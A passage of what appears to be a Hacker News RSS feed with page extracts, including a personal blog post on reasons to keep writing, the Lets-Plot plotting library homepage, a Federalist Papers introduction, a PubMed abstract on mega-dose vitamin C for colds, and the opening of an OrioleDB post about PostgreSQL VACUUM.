                                        <p>Anders Gyllenhaal was an investigative reporter at <i>The Miami Herald</i> and executive editor at <i>The News &amp; Observer, The Star Tribune</i> (Minneapolis), and <i>The Herald</i>. He also served as the editorial vice president for the McClatchy Company’s 30 newsrooms and 2,000 journalists. He served on the Pulitzer Prize board for nine years.</p>
                          </li>
                        <li>
              <div>
              <h6>Beverly Gyllenhaal</h6>
              <p>Posted on June 30, 2023</p>
              </div>
                                        <p>Beverly Gyllenhaal was a reporter, features writer, and food editor at <i>The News &amp; Observer</i> and <i>The Miami Herald</i>. She coauthored a syndicated column that appeared in 100 newspapers around the US and produced three books with nearly half a million copies in print.</p>
                          </li>
                  </ul>
      <!-- article-author -->

        <!--- Sponsored Text ----------------->
                <!--- End Sponsored Text -------------->
        
                
              
      <!-- comp-grid end -->
        <div>
  <p><img decoding="async" src="https://nautil.us/wp-content/themes/nautilus-block-theme/images/icons/logo-icon.svg" alt="new_letter"></p><div>
    <h4>Get the Nautilus newsletter</h4>
    <p>Cutting-edge science, unraveled by the very brightest living thinkers.</p>
  </div>

  
</div>        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Nobody cares about your blog (266 pts)]]></title>
            <link>https://www.alexmolas.com/2023/07/15/nobody-cares-about-your-blog.html</link>
            <guid>36741620</guid>
            <pubDate>Sat, 15 Jul 2023 22:47:53 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.alexmolas.com/2023/07/15/nobody-cares-about-your-blog.html">https://www.alexmolas.com/2023/07/15/nobody-cares-about-your-blog.html</a>, See on <a href="https://news.ycombinator.com/item?id=36741620">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
      <p>I started writing on my blog some years ago, and since then I’ve had a lot of reasons to stop writing. Here’s a list of why nobody cares about your blog</p>

<ul>
  <li>Your blog is not original. There are hundreds of blogs out there, what makes you think yours is different? You’re just probably repeating things you’ve read in another place.</li>
  <li>You’re not an expert in your field, otherwise you wouldn’t be publishing in a blog, but writing papers and giving interviews.</li>
  <li>You are only showing the world how stupid you are. If what you say is not better than silence, you better shut up.</li>
  <li>If someone, at some point, cares about your blog will be only to criticize it. Your work is trash, and exposing it will make people notice you’re trash as well.</li>
</ul>

<p>But all of these things are not a problem, because you shouldn’t care even a little bit about what other think. Here are my reasons about why you should care about your blog</p>

<ul>
  <li>You can use it as notes to your future self. After some years you’ll have a nice journal of how you have evolved over the years. Rereading your old texts is like communicating with your past self.</li>
  <li>To release ideas that you have in your head and that you need to get out. Even if nobody else cares about them, writing them down can be a cathartic process.</li>
  <li>To learn to write and express complex ideas. The best way to learn is to teach (even if nobody is reading you). As Paul Graham says <sup id="fnref:1" role="doc-noteref"><a href="#fn:1" rel="footnote">1</a></sup>, writing about something, even something you know well, usually shows you that you didn’t know it as well as you thought.</li>
  <li>Even if the ideas you’re sharing with the world aren’t original you can enrich them with your personal view. As Bill Thurson said <sup id="fnref:2" role="doc-noteref"><a href="#fn:2" rel="footnote">2</a></sup> all of us have clear understanding of a few things and murky concepts of many more. There is no way to run out of ideas in need of clarification.</li>
  <li>If you have lost time solving a superspecific problem then you need to write about it, it can happen that you end up being someone hero some day. It can also happen that you’ll have the same problem again and then you’ll be your own hero.</li>
  <li>It’s cool to maintain a blog, even it’s only from the technical perspective. The feeling of complete ownership over something is really fulfilling, even if it’s just some bytes on a remote server in this ethereal world.</li>
  <li>You can say whatever the fuck you want. It’s your blog, you don’t need to follow any rules. I just cursed and you can’t do nothing about it, because this is my blog and I do what I want. This will give you a sense of freedom that’s really cool imho.</li>
</ul>

<p>PS. I was just about to publish this post, and then I started to think “why should I publish this text? Who is going to loose their time to read this crap?”, but you know what? I just don’t care what you think, here’s my post and you can do nothing about it :)</p>

<hr>



    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Lets-Plot: An open-source plotting library by JetBrains (278 pts)]]></title>
            <link>https://lets-plot.org/</link>
            <guid>36741476</guid>
            <pubDate>Sat, 15 Jul 2023 22:22:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://lets-plot.org/">https://lets-plot.org/</a>, See on <a href="https://news.ycombinator.com/item?id=36741476">Hacker News</a></p>
<div id="readability-page-1" class="page"><section id="an-open-source-plotting-library-for-statistical-data" role="main">

<a href="https://confluence.jetbrains.com/display/ALL/JetBrains+on+GitHub"><img alt="JB Official" src="https://jb.gg/badges/official-flat-square.svg"></a>
<a href="https://pypi.org/project/lets-plot"><img alt="Latest release" src="https://img.shields.io/pypi/v/lets-plot?color=green&amp;style=flat-square"></a>
<a href="https://lets-plot.org/pages/licenses.html">
  <img alt="MIT License" src="https://img.shields.io/pypi/l/lets-plot?color=yellow&amp;style=flat-square">
</a><p><strong>Python versions:</strong> 3.7-3.11</p>
<p><strong>OS:</strong> Linux, macOS, Windows</p>
<section id="installation">
<h2>Installation<a href="#installation" title="Permalink to this headline">¶</a></h2>

</section>
<section id="quickstart">
<h2>Quickstart<a href="#quickstart" title="Permalink to this headline">¶</a></h2>
<div><pre><span></span><span> 1</span><span>import</span> <span>numpy</span> <span>as</span> <span>np</span>
<span> 2</span><span>from</span> <span>lets_plot</span> <span>import</span> <span>*</span>
<span> 3</span><span>LetsPlot</span><span>.</span><span>setup_html</span><span>()</span>
<span> 4</span>
<span> 5</span><span>np</span><span>.</span><span>random</span><span>.</span><span>seed</span><span>(</span><span>12</span><span>)</span>
<span> 6</span><span>data</span> <span>=</span> <span>dict</span><span>(</span>
<span> 7</span>    <span>cond</span><span>=</span><span>np</span><span>.</span><span>repeat</span><span>([</span><span>'A'</span><span>,</span> <span>'B'</span><span>],</span> <span>200</span><span>),</span>
<span> 8</span>    <span>rating</span><span>=</span><span>np</span><span>.</span><span>concatenate</span><span>((</span><span>np</span><span>.</span><span>random</span><span>.</span><span>normal</span><span>(</span><span>0</span><span>,</span> <span>1</span><span>,</span> <span>200</span><span>),</span> <span>np</span><span>.</span><span>random</span><span>.</span><span>normal</span><span>(</span><span>1</span><span>,</span> <span>1.5</span><span>,</span> <span>200</span><span>)))</span>
<span> 9</span><span>)</span>
<span>10</span>
<span>11</span><span>ggplot</span><span>(</span><span>data</span><span>,</span> <span>aes</span><span>(</span><span>x</span><span>=</span><span>'rating'</span><span>,</span> <span>fill</span><span>=</span><span>'cond'</span><span>))</span> <span>+</span> <span>ggsize</span><span>(</span><span>700</span><span>,</span> <span>300</span><span>)</span> <span>+</span> \
<span>12</span>    <span>geom_density</span><span>(</span><span>color</span><span>=</span><span>'dark_green'</span><span>,</span> <span>alpha</span><span>=</span><span>.7</span><span>)</span> <span>+</span> <span>scale_fill_brewer</span><span>(</span><span>type</span><span>=</span><span>'seq'</span><span>)</span> <span>+</span> \
<span>13</span>    <span>theme</span><span>(</span><span>panel_grid_major_x</span><span>=</span><span>'blank'</span><span>)</span>
</pre></div>

</section>
<section id="meet-the-grammar-of-graphics">
<span id="index-meet-gog"></span><h2>Meet the Grammar of Graphics<a href="#meet-the-grammar-of-graphics" title="Permalink to this headline">¶</a></h2>
<div>
<div>
<p><a href="https://ggplot2-book.org/index.html"><img alt="_images/ggplot2-elegant-graphics-for-data-analysis.jpg" src="https://lets-plot.org/_images/ggplot2-elegant-graphics-for-data-analysis.jpg"></a>
</p>
</div>
<div>
<p>Lets-Plot API is largely based on the <a href="https://lets-plot.org/pages/api.html#api"><span>API</span></a> provided by <a href="https://ggplot2.tidyverse.org/">ggplot2</a> package well-known to data scientists who use R.</p>
<p>To learn more about the grammar of graphics, we recommend an excellent book called “ggplot2: Elegant Graphics for Data Analysis”. This will be a good prerequisite for further exploration of the Lets-Plot library.</p>
</div>
</div>
</section>
<section id="explore-your-data-with-lets-plot">
<h2>Explore Your Data with Lets-Plot<a href="#explore-your-data-with-lets-plot" title="Permalink to this headline">¶</a></h2>

</section>
<section id="key-features">
<h2>Key Features<a href="#key-features" title="Permalink to this headline">¶</a></h2>
<div>
<div>
<p><img alt="_images/ggplot2-like-api.svg" src="https://lets-plot.org/_images/ggplot2-like-api.svg"></p><p>ggplot2-like API</p>
<p>A bridge between R (<a href="#index-meet-gog"><span>ggplot2</span></a>) and Python Data visualization.</p>
</div>
<div>
<p><img alt="_images/tooltips.svg" src="https://lets-plot.org/_images/tooltips.svg"></p><p>Customizable Tooltips</p>
<p>You can customize the content, values formatting and appearance of tooltip for any geometry layer in your plot. <a href="https://datalore.jetbrains.com/view/notebook/78LwZrCQ7uHy8P5L0iOcqr">Learn more</a>.</p>
</div>

<div>
<p><img alt="_images/formatting.svg" src="https://lets-plot.org/_images/formatting.svg"></p><p>Formatting</p>
<p>Lets-Plot supports formatting of numeric and date-time values in tooltips, legends, on the axes and text geometry layer. <a href="https://lets-plot.org/pages/formats.html#formats"><span>Learn more</span></a>.</p>
</div>
<div>
<p><img alt="_images/kotlin.svg" src="https://lets-plot.org/_images/kotlin.svg"></p><p>Kotlin API</p>
<p>R, Python, what’s next? Right. <a href="https://github.com/JetBrains/lets-plot-kotlin">Lets-Plot Kotlin API</a> enables data visualization in JVM and Kotlin/JS applications as well as in scientific notebooks like Jupyter and Datalore.</p>
</div>
<div>
<p><img alt="_images/sampling.svg" src="https://lets-plot.org/_images/sampling.svg"></p><p>Sampling</p>
<p>Sampling is a special technique of data transformation, which helps to deal with large datasets and overplotting. <a href="https://lets-plot.org/pages/sampling.html#sampling"><span>Learn more</span></a>.</p>
</div>
<div>
<p><img alt="_images/geospatial-visualization.svg" src="https://lets-plot.org/_images/geospatial-visualization.svg"></p><p>Geospatial Visualization</p>
<p>Find spatial objects with the help of our powerful and easy to use <a href="https://lets-plot.org/pages/geocoding.html#geocoding"><span>Geocoding</span></a> module. In case you already have <code><span>GeoDataFrame</span></code> on hand - <a href="https://lets-plot.org/pages/geopandas.html#geopandas"><span>plot it</span></a> straight away.</p>
</div>
<div>
<p><img alt="_images/export.svg" src="https://lets-plot.org/_images/export.svg"></p><p>Export to SVG, HTML and PNG</p>
<p>The <a href="https://lets-plot.org/pages/api/lets_plot.ggsave.html#lets_plot.ggsave" title="lets_plot.ggsave"><code><span>ggsave()</span></code></a> function is an easy way to export plot to a file in SVG, HTML or PNG formats. <a href="https://nbviewer.jupyter.org/github/JetBrains/lets-plot-docs/blob/master/source/examples/cookbook/export.ipynb">Learn more</a>.</p>
</div>
<div>
<p><img alt="_images/interactive-maps.svg" src="https://lets-plot.org/_images/interactive-maps.svg"></p><p>Interactive Maps</p>
<p>Interactive maps allow zooming and panning around your geospatial data with customizable vector or raster basemaps as a backdrop. <a href="https://lets-plot.org/pages/maps.html#maps"><span>Learn more</span></a>.</p>
</div>
<div>
<p><img alt="_images/offline-mode.svg" src="https://lets-plot.org/_images/offline-mode.svg"></p><p>‘No Javascript’ and Offline Mode</p>
<p>In the ‘no javascript’ mode Lets-Plot generates plots as bare-bones SVG images. Plots in the notebook with option <code><span>offline=True</span></code> will be working without an Internet connection. <a href="https://lets-plot.org/pages/no_js_and_offline_mode.html#no-js-and-offline-mode"><span>Learn more</span></a>.</p>
</div>
</div>
</section>
</section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Full Text of the Federalist Papers (173 pts)]]></title>
            <link>https://guides.loc.gov/federalist-papers/full-text</link>
            <guid>36741430</guid>
            <pubDate>Sat, 15 Jul 2023 22:15:34 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://guides.loc.gov/federalist-papers/full-text">https://guides.loc.gov/federalist-papers/full-text</a>, See on <a href="https://news.ycombinator.com/item?id=36741430">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="s-lg-box-wrapper-25493140">
				<p><em>The Federalist</em>, commonly referred to as the Federalist Papers, is a series of 85 essays written by Alexander Hamilton, John Jay, and James Madison between October 1787 and May 1788. The essays were published anonymously, under the pen name "Publius," in various New York state newspapers of the time.</p>

<p>The Federalist Papers were written and published to urge New Yorkers to ratify the proposed United States Constitution, which was drafted in Philadelphia in the summer of 1787. In lobbying for adoption of the Constitution over the existing Articles of Confederation, the essays explain particular provisions of the Constitution in detail. For this reason, and because Hamilton and Madison were each members of the Constitutional Convention, the Federalist Papers are often used today to help interpret the intentions of those drafting the Constitution.</p>

<p>The Federalist Papers were published primarily in two New York state newspapers: <em>The New York Packet</em> and <em>The Independent Journal</em>. They were reprinted in other newspapers in New York state and in several cities in other states. A bound edition, with revisions and corrections by Hamilton, was published in 1788 by printers J. and A. McLean. An edition published by printer Jacob Gideon in 1818, with revisions and corrections by Madison, was the first to identify each essay by its author's name. Because of its publishing history, the assignment of authorship, numbering, and exact wording may vary with different editions of <em>The Federalist</em>.</p>

<p>The electronic text of <em>The Federalist</em> used here was compiled for Project Gutenberg by scholars who drew on many available versions of the papers.</p>

<p>One printed edition of the text is <em>The Federalist</em>, edited by Jacob E. Cooke (Middletown, Conn., Wesleyan University Press, 1961). Cooke's introduction provides background information on the printing history of The Federalist; the information provided above comes in part from his work.</p>

<p>This web-friendly presentation of the original text of the Federalist Papers (also known as The Federalist) was obtained from the e-text archives of Project Gutenberg. Any irregularities with regard to grammar, syntax, spelling, or punctuation are as they exist in the original e-text archives.</p>

		   </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Mega-dose vitamin C in treatment of the common cold (2001) (101 pts)]]></title>
            <link>https://pubmed.ncbi.nlm.nih.gov/11700812/</link>
            <guid>36741236</guid>
            <pubDate>Sat, 15 Jul 2023 21:44:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://pubmed.ncbi.nlm.nih.gov/11700812/">https://pubmed.ncbi.nlm.nih.gov/11700812/</a>, See on <a href="https://news.ycombinator.com/item?id=36741236">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="article-page" data-article-pmid="11700812">
    
<!-- "Filters applied" shows only when page is redirected from search -->
<!-- because search found one result -->

    

    

    <main id="article-details">
  
  

  

  



  


<header id="heading">
  
    
      
      <div id="short-view-heading">
        
  <p>Clinical Trial</p>


        

<h2>
  
    
    
    
    
      
  Mega-dose vitamin C in treatment of the common cold: a randomised controlled trial


    
  
</h2>

        

        <p><span>
    
      
        <span><span>C Audera</span><span>&nbsp;et al.</span></span>
      
    
  </span>
  
    
      <span>
        Med J Aust<span>.</span>
      </span>
      
        <span>
          <time datetime="2001">2001</time><span>.</span>
        </span>
      
    
  
</p>

        
        
        
      </div>
    
  
</header>

  



  

  



  <div id="abstract">
    
      <h2>
        Abstract
        
      </h2>
      
        
          
            <div id="eng-abstract">
              
                


  
    <p>
      
        <strong>
          Objective:
        </strong>
      
      To determine the effect of large doses of vitamin C in the treatment of the common cold.
    </p>
  

  


              
                


  
    <p>
      
        <strong>
          Study design:
        </strong>
      
      Double-blind, randomised clinical trial with four intervention arms: vitamin C at daily doses of 0.03g ("placebo"), 1 g, 3g, or 3g with additives ("Bio-C") taken at onset of a cold and for the following two days.
    </p>
  

  


              
                


  
    <p>
      
        <strong>
          Participants and setting:
        </strong>
      
      400 healthy volunteers were recruited from staff and students of the Australian National University, Canberra, ACT, between May 1998 and November 1999. The trial continued for 18 months.
    </p>
  

  


              
                


  
    <p>
      
        <strong>
          Interventions:
        </strong>
      
      Participants were instructed to commence medication when they had experienced early symptoms of a cold for four hours, and to record daily their symptoms, severity, doctor visits and use of other medications.
    </p>
  

  


              
                


  
    <p>
      
        <strong>
          Main outcome measures:
        </strong>
      
      Duration of symptoms and cold episodes; cumulative symptom severity scores after 7, 14 and 28 days; doctor visits; and whether participants guessed which medication they were taking.
    </p>
  

  


              
                


  
    <p>
      
        <strong>
          Results:
        </strong>
      
      149 participants returned records for 184 cold episodes. No significant differences were observed in any measure of cold duration or severity between the four medication groups. Although differences were not significant, the placebo group had the shortest duration of nasal, systemic and overall symptoms, and the lowest mean severity score at 14 days, and the second lowest at 7 and 28 days.
    </p>
  

  


              
                


  
    <p>
      
        <strong>
          Conclusions:
        </strong>
      
      Doses of vitamin C in excess of 1 g daily taken shortly after onset of a cold did not reduce the duration or severity of cold symptoms in healthy adult volunteers when compared with a vitamin C dose less than the minimum recommended daily intake.
    </p>
  

  


              
            </div>
          
        
      

      
    

    

    

  </div>


  
  



  

  
  

  
  
    
      <div id="linked-commentary">
        <h2>
          Comment in
        </h2>
        <ul>
          
            
              
              
  
    <li>
  
  <div>
    <p><a href="https://pubmed.ncbi.nlm.nih.gov/11700823/" ref="article_id=11700823&amp;linksrc=comments_link" data-ga-category="comment_correction" data-ga-action="11700823" data-ga-label="linked-commentary">
      
        Effect of a specific preparation of Chinese herbs ("clear the way") on duration and severity of the common cold.
      
    </a></p><p><span>Audera C, Patulny RV, Sander BH, Douglas RM.</span>
        
      
    
    <span>Audera C, et al.</span>
    <span>Med J Aust. 2001 Oct 1;175(7):389. doi: 10.5694/j.1326-5377.2001.tb143632.x.</span>
    <span>Med J Aust. 2001.</span>
  
  <span>PMID: <span>11700823</span></span>
  
  
  <span>Clinical Trial.</span>
  
  <span>No abstract available.</span>
</p>

  </div>
  
    </li>
  


            
          
            
              
              
  
    <li>
  
  <div>
    <p><a href="https://pubmed.ncbi.nlm.nih.gov/11999270/" ref="article_id=11999270&amp;linksrc=comments_link" data-ga-category="comment_correction" data-ga-action="11999270" data-ga-label="linked-commentary">
      
        Megadose vitamin C in treatment of the common cold: a randomised controlled trial.
      
    </a></p><p><span>Vitetta L, Sali A, Paspaliaris B, Reavley NJ.</span>
        
      
    
    <span>Vitetta L, et al.</span>
    <span>Med J Aust. 2002 Mar 18;176(6):298-9; author reply 299. doi: 10.5694/j.1326-5377.2002.tb04393.x.</span>
    <span>Med J Aust. 2002.</span>
  
  <span>PMID: <span>11999270</span></span>
  
  
  
  
  <span>No abstract available.</span>
</p>

  </div>
  
    </li>
  


            
          
        </ul>
      </div>
    
  


  
  
    <div id="similar">
      <h2>
        Similar articles
      </h2>
      
        <ul id="similar-articles-list">
          
  
    
      
  
    <li>
  
  <div>
    <p><a href="https://pubmed.ncbi.nlm.nih.gov/15495002/" ref="article_id=15495002&amp;linksrc=similar_articles_link&amp;ordinalpos=1" data-ga-category="similar_article" data-ga-action="15495002" data-ga-label="">
      
        Vitamin C for preventing and treating the common cold.
      
    </a></p><p><span>Douglas RM, Hemila H, D'Souza R, Chalker EB, Treacy B.</span>
        
      
    
    <span>Douglas RM, et al.</span>
    <span>Cochrane Database Syst Rev. 2004 Oct 18;(4):CD000980. doi: 10.1002/14651858.CD000980.pub2.</span>
    <span>Cochrane Database Syst Rev. 2004.</span>
  
  <span>PMID: <span>15495002</span></span>
  
  <span>Updated.</span>
  <span>Review.</span>
  
  
</p>

  </div>
  
    </li>
  


    
  

  
    
      
  
    <li>
  
  <div>
    <p><a href="https://pubmed.ncbi.nlm.nih.gov/17636648/" ref="article_id=17636648&amp;linksrc=similar_articles_link&amp;ordinalpos=2" data-ga-category="similar_article" data-ga-action="17636648" data-ga-label="">
      
        Vitamin C for preventing and treating the common cold.
      
    </a></p><p><span>Douglas RM, Hemilä H, Chalker E, Treacy B.</span>
        
      
    
    <span>Douglas RM, et al.</span>
    <span>Cochrane Database Syst Rev. 2007 Jul 18;(3):CD000980. doi: 10.1002/14651858.CD000980.pub3.</span>
    <span>Cochrane Database Syst Rev. 2007.</span>
  
  <span>PMID: <span>17636648</span></span>
  
  <span>Updated.</span>
  <span>Review.</span>
  
  
</p>

  </div>
  
    </li>
  


    
  

  
    
      
  
    <li>
  
  <div>
    <p><a href="https://pubmed.ncbi.nlm.nih.gov/23440782/" ref="article_id=23440782&amp;linksrc=similar_articles_link&amp;ordinalpos=3" data-ga-category="similar_article" data-ga-action="23440782" data-ga-label="">
      
        Vitamin C for preventing and treating the common cold.
      
    </a></p><p><span>Hemilä H, Chalker E.</span>
        
      
    
    <span>Hemilä H, et al.</span>
    <span>Cochrane Database Syst Rev. 2013 Jan 31;2013(1):CD000980. doi: 10.1002/14651858.CD000980.pub4.</span>
    <span>Cochrane Database Syst Rev. 2013.</span>
  
  <span>PMID: <span>23440782</span></span>
  <span>Free PMC article.</span>
  
  <span>Review.</span>
  
  
</p>

  </div>
  
    </li>
  


    
  

  
    
      
  
    <li>
  
  <div>
    <p><a href="https://pubmed.ncbi.nlm.nih.gov/10796569/" ref="article_id=10796569&amp;linksrc=similar_articles_link&amp;ordinalpos=4" data-ga-category="similar_article" data-ga-action="10796569" data-ga-label="">
      
        Vitamin C for preventing and treating the common cold.
      
    </a></p><p><span>Douglas RM, Chalker EB, Treacy B.</span>
        
      
    
    <span>Douglas RM, et al.</span>
    <span>Cochrane Database Syst Rev. 2000;(2):CD000980. doi: 10.1002/14651858.CD000980.</span>
    <span>Cochrane Database Syst Rev. 2000.</span>
  
  <span>PMID: <span>10796569</span></span>
  
  <span>Updated.</span>
  <span>Review.</span>
  
  
</p>

  </div>
  
    </li>
  


    
  

  
    
      
  
    <li>
  
  <div>
    <p><a href="https://pubmed.ncbi.nlm.nih.gov/16118650/" ref="article_id=16118650&amp;linksrc=similar_articles_link&amp;ordinalpos=5" data-ga-category="similar_article" data-ga-action="16118650" data-ga-label="">
      
        Effect of vitamin C on common cold: randomized controlled trial.
      
    </a></p><p><span>Sasazuki S, Sasaki S, Tsubono Y, Okubo S, Hayashi M, Tsugane S.</span>
        
      
    
    <span>Sasazuki S, et al.</span>
    <span>Eur J Clin Nutr. 2006 Jan;60(1):9-17. doi: 10.1038/sj.ejcn.1602261.</span>
    <span>Eur J Clin Nutr. 2006.</span>
  
  <span>PMID: <span>16118650</span></span>
  
  
  <span>Clinical Trial.</span>
  
  
</p>

  </div>
  
    </li>
  


    
  


        </ul>

        
          

        
      
    </div>
  


  


  
    <div id="citedby">
      <h2>
        Cited by
      </h2>
      
        <ul id="citedby-articles-list">
          
  
    
      
  
    <li>
  
  <div>
    <p><a href="https://pubmed.ncbi.nlm.nih.gov/36793782/" ref="article_id=36793782&amp;linksrc=citedby_articles_link&amp;ordinalpos=1" data-ga-category="cited_by" data-ga-action="36793782" data-ga-label="">
      
        The Role of Some Vitamins in Respiratory-related Viral Infections: A Narrative Review.
      
    </a></p><p><span>Park JH, Lee Y, Choi M, Park E.</span>
        
      
    
    <span>Park JH, et al.</span>
    <span>Clin Nutr Res. 2023 Jan 31;12(1):77-89. doi: 10.7762/cnr.2023.12.1.77. eCollection 2023 Jan.</span>
    <span>Clin Nutr Res. 2023.</span>
  
  <span>PMID: <span>36793782</span></span>
  <span>Free PMC article.</span>
  
  <span>Review.</span>
  
  
</p>

  </div>
  
    </li>
  


    
  

  
    
      
  
    <li>
  
  <div>
    <p><a href="https://pubmed.ncbi.nlm.nih.gov/34104701/" ref="article_id=34104701&amp;linksrc=citedby_articles_link&amp;ordinalpos=2" data-ga-category="cited_by" data-ga-action="34104701" data-ga-label="">
      
        Potential Role of Vitamins and Zinc on Acute Respiratory Infections Including Covid-19.
      
    </a></p><p><span>Murni IK, Prawirohartono EP, Triasih R.</span>
        
      
    
    <span>Murni IK, et al.</span>
    <span>Glob Pediatr Health. 2021 May 31;8:2333794X211021739. doi: 10.1177/2333794X211021739. eCollection 2021.</span>
    <span>Glob Pediatr Health. 2021.</span>
  
  <span>PMID: <span>34104701</span></span>
  <span>Free PMC article.</span>
  
  <span>Review.</span>
  
  
</p>

  </div>
  
    </li>
  


    
  

  
    
      
  
    <li>
  
  <div>
    <p><a href="https://pubmed.ncbi.nlm.nih.gov/33472840/" ref="article_id=33472840&amp;linksrc=citedby_articles_link&amp;ordinalpos=3" data-ga-category="cited_by" data-ga-action="33472840" data-ga-label="">
      
        Effect of micronutrient supplements on influenza and other respiratory tract infections among adults: a systematic review and meta-analysis.
      
    </a></p><p><span>Abioye AI, Bromage S, Fawzi W.</span>
        
      
    
    <span>Abioye AI, et al.</span>
    <span>BMJ Glob Health. 2021 Jan;6(1):e003176. doi: 10.1136/bmjgh-2020-003176.</span>
    <span>BMJ Glob Health. 2021.</span>
  
  <span>PMID: <span>33472840</span></span>
  <span>Free PMC article.</span>
  
  
  
  
</p>

  </div>
  
    </li>
  


    
  

  
    
      
  
    <li>
  
  <div>
    <p><a href="https://pubmed.ncbi.nlm.nih.gov/30069463/" ref="article_id=30069463&amp;linksrc=citedby_articles_link&amp;ordinalpos=4" data-ga-category="cited_by" data-ga-action="30069463" data-ga-label="">
      
        Extra Dose of Vitamin C Based on a Daily Supplementation Shortens the Common Cold: A Meta-Analysis of 9 Randomized Controlled Trials.
      
    </a></p><p><span>Ran L, Zhao W, Wang J, Wang H, Zhao Y, Tseng Y, Bu H.</span>
        
      
    
    <span>Ran L, et al.</span>
    <span>Biomed Res Int. 2018 Jul 5;2018:1837634. doi: 10.1155/2018/1837634. eCollection 2018.</span>
    <span>Biomed Res Int. 2018.</span>
  
  <span>PMID: <span>30069463</span></span>
  <span>Free PMC article.</span>
  <span>Retracted.</span>
  
  
  
</p>

  </div>
  
    </li>
  


    
  

  
    
      
  
    <li>
  
  <div>
    <p><a href="https://pubmed.ncbi.nlm.nih.gov/25606153/" ref="article_id=25606153&amp;linksrc=citedby_articles_link&amp;ordinalpos=5" data-ga-category="cited_by" data-ga-action="25606153" data-ga-label="">
      
        Evidence based medicine series: evidence based medicine: an overview.
      
    </a></p><p><span>Lai N.</span>
        
      
    
    <span>Lai N.</span>
    <span>Malays Fam Physician. 2009 Apr 30;4(1):19-22. eCollection 2009.</span>
    <span>Malays Fam Physician. 2009.</span>
  
  <span>PMID: <span>25606153</span></span>
  <span>Free PMC article.</span>
  
  <span>Review.</span>
  
  <span>No abstract available.</span>
</p>

  </div>
  
    </li>
  


    
  


        </ul>

        
          

        
      
    </div>
  


  
  
  
    <div id="publication-types">
      <h2>
        Publication types
      </h2>

      <ul><li></li><li></li><li></li><li></li></ul>
    </div>
  


  
  
    <div id="mesh-terms">
      <h2>
        MeSH terms
      </h2>

      <ul><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul>
    </div>
  


  
  
    <div id="substances">
      <h2>
        Substances
      </h2>

      <ul><li></li></ul>
    </div>
  


  

  

  



  
  

  



  
  <div id="linkout">
    <h2>
      LinkOut - more resources
    </h2>

    <ul><li><h3>Full Text Sources</h3><ul><li><a href="https://www.mja.com.au/public/issues/175_07_011001/audera/audera.html" target="_blank" rel="noopener" ref="linksrc=linkout_link&amp;PrId=3829&amp;uid=11700812&amp;db=pubmed&amp;itool=Abstract&amp;log$=linkoutlink&amp;nlmid=0400714" data-ga-category="link_out" data-ga-action="Full Text Sources" data-ga-label="Australasian Medical Publishing Company">
                    Australasian Medical Publishing Company
                  </a></li><li><a href="http://ovidsp.ovid.com/ovidweb.cgi?T=JS&amp;PAGE=linkout&amp;SEARCH=11700812.ui" target="_blank" rel="noopener" ref="linksrc=linkout_link&amp;PrId=3682&amp;uid=11700812&amp;db=pubmed&amp;itool=Abstract&amp;log$=linkoutlink&amp;nlmid=0400714" data-ga-category="link_out" data-ga-action="Full Text Sources" data-ga-label="Ovid Technologies, Inc.">
                    Ovid Technologies, Inc.
                  </a></li><li><a href="https://doi.org/10.5694/j.1326-5377.2001.tb143618.x" target="_blank" rel="noopener" ref="linksrc=linkout_link&amp;PrId=3058&amp;uid=11700812&amp;db=pubmed&amp;itool=Abstract&amp;log$=linkoutlink&amp;nlmid=0400714" data-ga-category="link_out" data-ga-action="Full Text Sources" data-ga-label="Wiley">
                    Wiley
                  </a></li></ul></li><li><h3>Medical</h3><ul><li><a href="https://medlineplus.gov/commoncold.html" target="_blank" rel="noopener" ref="linksrc=linkout_link&amp;PrId=3162&amp;uid=11700812&amp;db=pubmed&amp;itool=Abstract&amp;log$=linkoutlink&amp;nlmid=0400714" data-ga-category="link_out" data-ga-action="Medical" data-ga-label="MedlinePlus Health Information">
                    MedlinePlus Health Information
                  </a></li></ul></li></ul>
  </div>


</main>

    
  


    

    

  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[PostgreSQL: No More Vacuum, No More Bloat (372 pts)]]></title>
            <link>https://www.orioledata.com/blog/no-more-vacuum-in-postgresql/</link>
            <guid>36740921</guid>
            <pubDate>Sat, 15 Jul 2023 21:03:17 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.orioledata.com/blog/no-more-vacuum-in-postgresql/">https://www.orioledata.com/blog/no-more-vacuum-in-postgresql/</a>, See on <a href="https://news.ycombinator.com/item?id=36740921">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>PostgreSQL, a powerful open-source object-relational database system, has been lauded for its robustness, functionality, and flexibility. However, it is not without its challenges – one of which is the notorious VACUUM process. However, the dawn of a new era is upon us with <a href="https://github.com/orioledb/orioledb">OrioleDB</a>, a novel engine designed for PostgreSQL that promises to eliminate the need for the resource-consuming VACUUM.</p>
<h3 id="the-terrifying-tale-of-vacuum-in-postgresql">The Terrifying Tale of VACUUM in PostgreSQL</h3>
<p>The VACUUM process in PostgreSQL is a historical artifact that traces its roots back to the Berkley Postgres project, which implemented a concept known as infinite time-travel. The concept, while innovative at the time, was eventually dropped by the PostgreSQL community. However, it led to the implementation of a Multi-Version Concurrency Control (MVCC) system prone to table bloat.</p>
<p>The PostgreSQL MVCC system, while beneficial for handling concurrent transactions, introduced the need for manual vacuuming. This was a process in which old, unneeded data was purged to free up space and ensure efficient database operations. Manual vacuuming, however, was a labor-intensive task and a potential source of inefficiencies in the system.</p>
<p>The PostgreSQL community, in their continued efforts to improve the system, introduced autovacuum - an automatic vacuuming process designed to alleviate the need for manual vacuuming. This was a significant step forward, but it was not a perfect solution. The autovacuum process, while automatic, still consumed substantial system resources. This is  one of the reasons why <a href="https://www.uber.com/en-US/blog/postgres-to-mysql-migration/">Uber decided to migrate from PostgreSQL to MySQL</a> and one of the <a href="https://rbranson.medium.com/10-things-i-hate-about-postgresql-20dbab8c2791">10 things that Richard Branson hates about PostgreSQL</a>.</p>
